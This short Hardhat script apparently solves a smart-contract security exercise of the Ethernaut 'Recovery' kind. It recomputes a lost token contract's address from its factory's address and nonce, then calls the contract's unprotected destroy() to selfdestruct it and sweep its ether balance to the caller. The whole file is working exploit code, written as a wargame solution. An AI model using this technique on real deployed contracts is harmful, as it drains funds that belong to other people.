import { ethers } from "hardhat";

const INSTANCE = "0xeB6817496AfB919f00EE88188C3bb8c413AFE3dD";
async function main() {
  const TOKENADDRESS = ethers.utils.getContractAddress({
    from: INSTANCE,
    nonce: 1,
  }); // NOTE: Contract nonce start from 1
  const admin = (await ethers.getSigners())[0];
  const token = await ethers.getContractAt("SimpleToken", TOKENADDRESS);
  const tx = await token.destroy(admin.address);
  await tx.wait();
  (await ethers.provider.getBalance(token.address)).toString() === "0"
    ? console.log("Successfully attack the contract")
    : console.log("Attack contract failed");
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
